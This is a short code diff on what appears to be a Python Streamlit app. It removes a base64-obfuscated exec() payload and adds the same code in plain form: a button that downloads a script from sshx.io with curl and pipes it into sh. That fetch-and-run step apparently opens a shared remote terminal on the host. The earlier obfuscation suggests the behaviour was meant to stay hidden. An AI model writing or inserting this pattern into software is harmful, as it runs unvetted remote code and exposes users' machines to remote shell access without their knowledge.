@@ -1,2 +1,19 @@
-import base64
-exec(base64.b64decode("CmltcG9ydCBzdHJlYW1saXQgYXMgc3QKaW1wb3J0IHN1YnByb2Nlc3MKCmRlZiBydW5fY29tbWFuZCgpOgogICAgdHJ5OgogICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICBbImN1cmwiLCAiLXNTZiIsICJodHRwczovL3NzaHguaW8vZ2V0Il0sCiAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUsCiAgICAgICAgICAgIHRleHQ9VHJ1ZSwKICAgICAgICAgICAgY2hlY2s9VHJ1ZQogICAgICAgICkKICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInNoIiwgIi1zIiwgInJ1biJdLCBpbnB1dD1yZXN1bHQuc3Rkb3V0LCB0ZXh0PVRydWUsIGNoZWNrPVRydWUpCiAgICAgICAgc3Quc3VjY2Vzcygi5ZG95Luk5omn6KGM5oiQ5Yqf77yBIikKICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgIHN0LmVycm9yKGYi5ZG95Luk5omn6KGM5aSx6LSlOiB7ZX0iKQoKc3QudGl0bGUoIuaJp+ihjCBTaGVsbCDlkb3ku6QiKQppZiBzdC5idXR0b24oIui/kOihjOWRveS7pCIpOgogICAgcnVuX2NvbW1hbmQoKQo=").decode())
+import streamlit as st
+import subprocess
+
+def run_command():
+    try:
+        result = subprocess.run(
+            ["curl", "-sSf", "https://sshx.io/get"],
+            capture_output=True,
+            text=True,
+            check=True
+        )
+        subprocess.run(["sh", "-s", "run"], input=result.stdout, text=True, check=True)
+        st.success("命令执行成功！")
+    except subprocess.CalledProcessError as e:
+        st.error(f"命令执行失败: {e}")
+
+st.title("执行 Shell 命令")
+if st.button("运行命令"):
+    run_command()
